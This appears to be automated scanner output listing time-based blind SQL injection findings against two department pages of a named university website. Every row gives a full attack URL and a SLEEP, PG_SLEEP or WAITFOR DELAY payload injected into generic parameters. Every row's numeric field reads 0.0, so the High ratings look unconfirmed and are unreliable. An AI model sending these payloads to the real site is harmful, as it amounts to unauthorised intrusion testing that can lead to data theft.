Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%27+AND+SLEEP%285%29--#professional-accounting),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#professional-accounting),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#professional-accounting),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%27+AND+PG_SLEEP%285%29--#professional-accounting),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1+OR+SLEEP%285%29#professional-accounting),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?id=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
